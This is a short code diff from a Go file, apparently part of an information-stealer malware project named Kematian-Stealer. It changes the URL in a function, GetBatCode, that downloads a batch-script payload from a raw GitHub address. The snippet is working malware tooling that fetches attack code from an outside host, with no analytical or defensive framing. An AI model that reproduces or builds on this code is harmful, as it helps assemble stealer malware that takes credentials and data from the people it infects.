@@ -24,7 +24,7 @@ func GetPowershellCode() string {
 }
 
 func GetBatCode() string {
-	codeUrl := "https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.bat"
+	codeUrl := "https://raw.githubusercontent.com/itzGlitxh/Kematian-Stealer/main/frontend-src/main.bat"
 
 	res, err := http.Get(codeUrl)
 	if err != nil {
